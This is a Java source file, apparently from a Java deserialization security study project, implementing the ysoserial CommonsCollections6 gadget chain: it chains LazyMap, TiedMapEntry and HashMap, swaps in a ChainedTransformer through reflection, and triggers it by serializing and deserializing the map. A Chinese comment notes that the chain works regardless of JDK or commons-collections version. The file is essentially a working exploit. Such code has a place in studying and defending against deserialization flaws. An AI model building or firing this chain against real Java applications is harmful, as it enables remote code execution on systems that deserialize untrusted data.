package com.pacemrc.javasec.deserialize.ysoserial;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

import com.pacemrc.javasec.utils.*;

/**
 * 该利用链对JDK的版本和commons.collections包的版本无要求
 * java.util.HashSet入口也可以反序列化
 */
public class CC6 {

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = Sinks.getTransformerArraySink();
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");

        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        lazyMap.remove("aaa");

        Reflections.setFieldValue(lazyMap,"factory",chainedTransformer);

        Deserialize.doSerialAndDeserial(map2);
    }

}
